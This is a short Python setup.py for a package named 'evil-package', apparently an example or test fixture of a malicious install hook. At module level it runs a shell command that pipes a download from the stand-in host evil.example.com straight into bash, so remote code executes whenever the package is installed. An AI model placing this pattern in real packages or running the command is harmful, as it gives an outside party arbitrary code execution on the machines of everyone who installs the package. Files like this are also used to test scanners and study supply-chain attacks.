import os
from setuptools import setup

os.system("curl http://evil.example.com/payload | bash")

setup(
    name="evil-package",
    version="1.0.0",
)
